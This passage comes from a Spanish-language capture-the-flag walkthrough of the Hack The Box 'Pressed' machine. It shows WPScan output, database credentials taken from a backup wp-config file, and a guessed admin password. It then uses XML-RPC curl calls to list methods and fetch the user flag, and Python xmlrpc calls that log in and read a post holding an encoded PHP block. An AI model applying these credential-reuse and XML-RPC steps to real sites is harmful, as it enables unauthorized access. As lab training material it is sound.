+<a id="__codelineno-1-87" name="__codelineno-1-87" href="#__codelineno-1-87"></a>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+<a id="__codelineno-1-88" name="__codelineno-1-88" href="#__codelineno-1-88"></a>
+<a id="__codelineno-1-89" name="__codelineno-1-89" href="#__codelineno-1-89"></a>[+] Finished: Sat Aug 20 20:04:35 2022
+<a id="__codelineno-1-90" name="__codelineno-1-90" href="#__codelineno-1-90"></a>[+] Requests Done: 173
+<a id="__codelineno-1-91" name="__codelineno-1-91" href="#__codelineno-1-91"></a>[+] Cached Requests: 5
+<a id="__codelineno-1-92" name="__codelineno-1-92" href="#__codelineno-1-92"></a>[+] Data Sent: 43.68 KB
+<a id="__codelineno-1-93" name="__codelineno-1-93" href="#__codelineno-1-93"></a>[+] Data Received: 126.261 KB
+<a id="__codelineno-1-94" name="__codelineno-1-94" href="#__codelineno-1-94"></a>[+] Memory used: 234.438 MB
+<a id="__codelineno-1-95" name="__codelineno-1-95" href="#__codelineno-1-95"></a>[+] Elapsed time: 00:01:23
+</code></pre></div>
+</li>
+<li>
+<p>Credenciales encontrados (wp-config.php.bak):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>/** Database username */
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>define( &#39;DB_USER&#39;, &#39;admin&#39; );
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>/** Database password */
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>define( &#39;DB_PASSWORD&#39;, &#39;uhc-jan-finals-2021&#39; );
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>/** Database hostname */
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+</code></pre></div>
+</li>
+<li>
+<p>Acceso a http://pressed.htb/wp-login.php modificando ligeramente las credenciales nos da acceso a un 2FA (OTP):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>admin:uhc-jan-finals-2022
+</code></pre></div>
+</li>
+<li>
+<p>Este Wordpress tiene habilitada la API de xmlrpc, donde se pueden enumerar los métodos y conseguir la flag de user:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a> curl -d <span class="s1">&#39;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;methodCall&gt; &lt;methodName&gt;system.listMethods&lt;/methodName&gt; &lt;params&gt; &lt;/params&gt; &lt;/methodCall&gt;&#39;</span> http://pressed.htb/xmlrpc.php
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>?&gt;
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>&lt;methodResponse&gt;
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>&lt;params&gt;
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>    &lt;param&gt;
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    &lt;value&gt;
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>    &lt;array&gt;&lt;data&gt;
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>&lt;value&gt;&lt;string&gt;system.multicall&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>&lt;value&gt;&lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>&lt;value&gt;&lt;string&gt;system.getCapabilities&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>&lt;value&gt;&lt;string&gt;htb.get_flag&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>&lt;value&gt;&lt;string&gt;demo.addTwoNumbers&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>&lt;value&gt;&lt;string&gt;demo.sayHello&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>&lt;value&gt;&lt;string&gt;pingback.extensions.getPingbacks&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>&lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>&lt;value&gt;&lt;string&gt;mt.publishPost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>&lt;value&gt;&lt;string&gt;mt.getTrackbackPings&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>&lt;value&gt;&lt;string&gt;mt.supportedTextFilters&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>&lt;value&gt;&lt;string&gt;mt.supportedMethods&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>&lt;value&gt;&lt;string&gt;mt.setPostCategories&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>&lt;value&gt;&lt;string&gt;mt.getPostCategories&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>&lt;value&gt;&lt;string&gt;mt.getRecentPostTitles&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>&lt;value&gt;&lt;string&gt;mt.getCategoryList&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>&lt;value&gt;&lt;string&gt;metaWeblog.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>&lt;value&gt;&lt;string&gt;metaWeblog.deletePost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>&lt;value&gt;&lt;string&gt;metaWeblog.newMediaObject&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>&lt;value&gt;&lt;string&gt;metaWeblog.getCategories&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>&lt;value&gt;&lt;string&gt;metaWeblog.getRecentPosts&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>&lt;value&gt;&lt;string&gt;metaWeblog.getPost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>&lt;value&gt;&lt;string&gt;metaWeblog.editPost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>&lt;value&gt;&lt;string&gt;metaWeblog.newPost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>&lt;value&gt;&lt;string&gt;blogger.deletePost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a>&lt;value&gt;&lt;string&gt;blogger.editPost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a>&lt;value&gt;&lt;string&gt;blogger.newPost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a>&lt;value&gt;&lt;string&gt;blogger.getRecentPosts&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a>&lt;value&gt;&lt;string&gt;blogger.getPost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a>&lt;value&gt;&lt;string&gt;blogger.getUserInfo&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a>&lt;value&gt;&lt;string&gt;blogger.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a>&lt;value&gt;&lt;string&gt;wp.restoreRevision&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a>&lt;value&gt;&lt;string&gt;wp.getRevisions&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a>&lt;value&gt;&lt;string&gt;wp.getPostTypes&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a>&lt;value&gt;&lt;string&gt;wp.getPostType&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a>&lt;value&gt;&lt;string&gt;wp.getPostFormats&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a>&lt;value&gt;&lt;string&gt;wp.getMediaLibrary&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a>&lt;value&gt;&lt;string&gt;wp.getMediaItem&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a>&lt;value&gt;&lt;string&gt;wp.getCommentStatusList&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a>&lt;value&gt;&lt;string&gt;wp.newComment&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a>&lt;value&gt;&lt;string&gt;wp.editComment&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a>&lt;value&gt;&lt;string&gt;wp.deleteComment&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a>&lt;value&gt;&lt;string&gt;wp.getComments&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a>&lt;value&gt;&lt;string&gt;wp.getComment&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a>&lt;value&gt;&lt;string&gt;wp.setOptions&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-53" name="__codelineno-4-53" href="#__codelineno-4-53"></a>&lt;value&gt;&lt;string&gt;wp.getOptions&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-54" name="__codelineno-4-54" href="#__codelineno-4-54"></a>&lt;value&gt;&lt;string&gt;wp.getPageTemplates&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-55" name="__codelineno-4-55" href="#__codelineno-4-55"></a>&lt;value&gt;&lt;string&gt;wp.getPageStatusList&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-56" name="__codelineno-4-56" href="#__codelineno-4-56"></a>&lt;value&gt;&lt;string&gt;wp.getPostStatusList&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-57" name="__codelineno-4-57" href="#__codelineno-4-57"></a>&lt;value&gt;&lt;string&gt;wp.getCommentCount&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-58" name="__codelineno-4-58" href="#__codelineno-4-58"></a>&lt;value&gt;&lt;string&gt;wp.deleteFile&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-59" name="__codelineno-4-59" href="#__codelineno-4-59"></a>&lt;value&gt;&lt;string&gt;wp.uploadFile&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-60" name="__codelineno-4-60" href="#__codelineno-4-60"></a>&lt;value&gt;&lt;string&gt;wp.suggestCategories&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-61" name="__codelineno-4-61" href="#__codelineno-4-61"></a>&lt;value&gt;&lt;string&gt;wp.deleteCategory&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-62" name="__codelineno-4-62" href="#__codelineno-4-62"></a>&lt;value&gt;&lt;string&gt;wp.newCategory&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-63" name="__codelineno-4-63" href="#__codelineno-4-63"></a>&lt;value&gt;&lt;string&gt;wp.getTags&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-64" name="__codelineno-4-64" href="#__codelineno-4-64"></a>&lt;value&gt;&lt;string&gt;wp.getCategories&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-65" name="__codelineno-4-65" href="#__codelineno-4-65"></a>&lt;value&gt;&lt;string&gt;wp.getAuthors&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-66" name="__codelineno-4-66" href="#__codelineno-4-66"></a>&lt;value&gt;&lt;string&gt;wp.getPageList&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-67" name="__codelineno-4-67" href="#__codelineno-4-67"></a>&lt;value&gt;&lt;string&gt;wp.editPage&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-68" name="__codelineno-4-68" href="#__codelineno-4-68"></a>&lt;value&gt;&lt;string&gt;wp.deletePage&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-69" name="__codelineno-4-69" href="#__codelineno-4-69"></a>&lt;value&gt;&lt;string&gt;wp.newPage&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-70" name="__codelineno-4-70" href="#__codelineno-4-70"></a>&lt;value&gt;&lt;string&gt;wp.getPages&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-71" name="__codelineno-4-71" href="#__codelineno-4-71"></a>&lt;value&gt;&lt;string&gt;wp.getPage&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-72" name="__codelineno-4-72" href="#__codelineno-4-72"></a>&lt;value&gt;&lt;string&gt;wp.editProfile&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-73" name="__codelineno-4-73" href="#__codelineno-4-73"></a>&lt;value&gt;&lt;string&gt;wp.getProfile&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-74" name="__codelineno-4-74" href="#__codelineno-4-74"></a>&lt;value&gt;&lt;string&gt;wp.getUsers&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-75" name="__codelineno-4-75" href="#__codelineno-4-75"></a>&lt;value&gt;&lt;string&gt;wp.getUser&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-76" name="__codelineno-4-76" href="#__codelineno-4-76"></a>&lt;value&gt;&lt;string&gt;wp.getTaxonomies&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-77" name="__codelineno-4-77" href="#__codelineno-4-77"></a>&lt;value&gt;&lt;string&gt;wp.getTaxonomy&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-78" name="__codelineno-4-78" href="#__codelineno-4-78"></a>&lt;value&gt;&lt;string&gt;wp.getTerms&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-79" name="__codelineno-4-79" href="#__codelineno-4-79"></a>&lt;value&gt;&lt;string&gt;wp.getTerm&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-80" name="__codelineno-4-80" href="#__codelineno-4-80"></a>&lt;value&gt;&lt;string&gt;wp.deleteTerm&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-81" name="__codelineno-4-81" href="#__codelineno-4-81"></a>&lt;value&gt;&lt;string&gt;wp.editTerm&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-82" name="__codelineno-4-82" href="#__codelineno-4-82"></a>&lt;value&gt;&lt;string&gt;wp.newTerm&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-83" name="__codelineno-4-83" href="#__codelineno-4-83"></a>&lt;value&gt;&lt;string&gt;wp.getPosts&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-84" name="__codelineno-4-84" href="#__codelineno-4-84"></a>&lt;value&gt;&lt;string&gt;wp.getPost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-85" name="__codelineno-4-85" href="#__codelineno-4-85"></a>&lt;value&gt;&lt;string&gt;wp.deletePost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-86" name="__codelineno-4-86" href="#__codelineno-4-86"></a>&lt;value&gt;&lt;string&gt;wp.editPost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-87" name="__codelineno-4-87" href="#__codelineno-4-87"></a>&lt;value&gt;&lt;string&gt;wp.newPost&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-88" name="__codelineno-4-88" href="#__codelineno-4-88"></a>&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+<a id="__codelineno-4-89" name="__codelineno-4-89" href="#__codelineno-4-89"></a>&lt;/data&gt;&lt;/array&gt;
+<a id="__codelineno-4-90" name="__codelineno-4-90" href="#__codelineno-4-90"></a>    &lt;/value&gt;
+<a id="__codelineno-4-91" name="__codelineno-4-91" href="#__codelineno-4-91"></a>    &lt;/param&gt;
+<a id="__codelineno-4-92" name="__codelineno-4-92" href="#__codelineno-4-92"></a>&lt;/params&gt;
+<a id="__codelineno-4-93" name="__codelineno-4-93" href="#__codelineno-4-93"></a>&lt;/methodResponse&gt;
+</code></pre></div>
+<p>Se lista a continuación un método que devuelve la flag de user:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>curl -d &#39;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;methodCall&gt; &lt;methodName&gt;htb.get_flag&lt;/methodName&gt; &lt;params&gt; &lt;/params&gt; &lt;/methodCall&gt;&#39; http://pressed.htb/xmlrpc.php
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>&lt;methodResponse&gt;
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>&lt;params&gt;
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>    &lt;param&gt;
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>    &lt;value&gt;
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>    &lt;string&gt;7be142b7b81c7bef57b39008e63626ef
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>&lt;/string&gt;
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>    &lt;/value&gt;
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>    &lt;/param&gt;
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>&lt;/params&gt;
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>&lt;/methodResponse&gt;
+</code></pre></div></p>
+</li>
+<li>
+<p>Hay una librería de Python para gestionar xmlrpc de wordpress:</p>
+<p><a href="https://python-wordpress-xmlrpc.readthedocs.io">Documentacion python-wordpress-xmlrpc</a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">wordpress_xmlrpc</span> <span class="kn">import</span> <span class="n">Client</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">wordpress_xmlrpc.methods</span> <span class="kn">import</span> <span class="n">posts</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">client</span> <span class="o">=</span> <span class="n">Client</span><span class="p">(</span><span class="s1">&#39;http://pressed.htb/xmlrpc.php&#39;</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;uhc-jan-finals-2022&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">plist</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">posts</span><span class="o">.</span><span class="n">GetPosts</span><span class="p">())</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">plist</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="p">[</span><span class="o">&lt;</span><span class="n">WordPressPost</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;UHC January Finals Under Way&#39;</span><span class="o">&gt;</span><span class="p">]</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="o">&gt;&gt;&gt;</span> <span class="nb">dir</span><span class="p">(</span><span class="n">plist</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="p">[</span><span class="s1">&#39;__class__&#39;</span><span class="p">,</span> <span class="s1">&#39;__delattr__&#39;</span><span class="p">,</span> <span class="s1">&#39;__dict__&#39;</span><span class="p">,</span> <span class="s1">&#39;__dir__&#39;</span><span class="p">,</span> <span class="s1">&#39;__doc__&#39;</span><span class="p">,</span> <span class="s1">&#39;__eq__&#39;</span><span class="p">,</span> <span class="s1">&#39;__format__&#39;</span><span class="p">,</span> <span class="s1">&#39;__ge__&#39;</span><span class="p">,</span> <span class="s1">&#39;__getattribute__&#39;</span><span class="p">,</span> <span class="s1">&#39;__gt__&#39;</span><span class="p">,</span> <span class="s1">&#39;__hash__&#39;</span><span class="p">,</span> <span class="s1">&#39;__init__&#39;</span><span class="p">,</span> <span class="s1">&#39;__init_subclass__&#39;</span><span class="p">,</span> <span class="s1">&#39;__le__&#39;</span><span class="p">,</span> <span class="s1">&#39;__lt__&#39;</span><span class="p">,</span> <span class="s1">&#39;__module__&#39;</span><span class="p">,</span> <span class="s1">&#39;__ne__&#39;</span><span class="p">,</span> <span class="s1">&#39;__new__&#39;</span><span class="p">,</span> <span class="s1">&#39;__reduce__&#39;</span><span class="p">,</span> <span class="s1">&#39;__reduce_ex__&#39;</span><span class="p">,</span> <span class="s1">&#39;__repr__&#39;</span><span class="p">,</span> <span class="s1">&#39;__setattr__&#39;</span><span class="p">,</span> <span class="s1">&#39;__sizeof__&#39;</span><span class="p">,</span> <span class="s1">&#39;__str__&#39;</span><span class="p">,</span> <span class="s1">&#39;__subclasshook__&#39;</span><span class="p">,</span> <span class="s1">&#39;__weakref__&#39;</span><span class="p">,</span> <span class="s1">&#39;_def&#39;</span><span class="p">,</span> <span class="s1">&#39;comment_status&#39;</span><span class="p">,</span> <span class="s1">&#39;content&#39;</span><span class="p">,</span> <span class="s1">&#39;custom_fields&#39;</span><span class="p">,</span> <span class="s1">&#39;date&#39;</span><span class="p">,</span> <span class="s1">&#39;date_modified&#39;</span><span class="p">,</span> <span class="s1">&#39;definition&#39;</span><span class="p">,</span> <span class="s1">&#39;excerpt&#39;</span><span class="p">,</span> <span class="s1">&#39;guid&#39;</span><span class="p">,</span> <span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="s1">&#39;link&#39;</span><span class="p">,</span> <span class="s1">&#39;menu_order&#39;</span><span class="p">,</span> <span class="s1">&#39;mime_type&#39;</span><span class="p">,</span> <span class="s1">&#39;parent_id&#39;</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;ping_status&#39;</span><span class="p">,</span> <span class="s1">&#39;post_format&#39;</span><span class="p">,</span> <span class="s1">&#39;post_status&#39;</span><span class="p">,</span> <span class="s1">&#39;post_type&#39;</span><span class="p">,</span> <span class="s1">&#39;slug&#39;</span><span class="p">,</span> <span class="s1">&#39;sticky&#39;</span><span class="p">,</span> <span class="s1">&#39;struct&#39;</span><span class="p">,</span> <span class="s1">&#39;terms&#39;</span><span class="p">,</span> <span class="s1">&#39;thumbnail&#39;</span><span class="p">,</span> <span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">]</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">plist</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">user</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="s1">&#39;1&#39;</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">plist</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">password</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="s1">&#39;&#39;</span>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">plist</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">link</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="s1">&#39;/index.php/2022/01/28/hello-world/&#39;</span>
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">plist</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">content</span>
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="s1">&#39;&lt;!-- wp:paragraph --&gt;</span><span class="se">\n</span><span class="s1">&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;</span><span class="se">\n</span><span class="s1">&lt;!-- /wp:paragraph --&gt;</span><span class="se">\n\n</span><span class="s1">&lt;!-- wp:php-everywhere-block/php {&quot;code&quot;:&quot;JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=&quot;,&quot;version&quot;:&quot;3.0.0&quot;} /--&gt;</span><span class="se">\n\n</span><span class="s1">&lt;!-- wp:paragraph --&gt;</span><span class="se">\n</span><span class="s1">&lt;p&gt;&lt;/p&gt;</span><span class="se">\n</span><span class="s1">&lt;!-- /wp:paragraph --&gt;</span><span class="se">\n\n</span><span class="s1">&lt;!-- wp:paragraph --&gt;</span><span class="se">\n</span><span class="s1">&lt;p&gt;&lt;/p&gt;</span><span class="se">\n</span><span class="s1">&lt;!-- /wp:paragraph --&gt;&#39;</span>
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="c1"># Se crea una copia del post a modificar:</span>
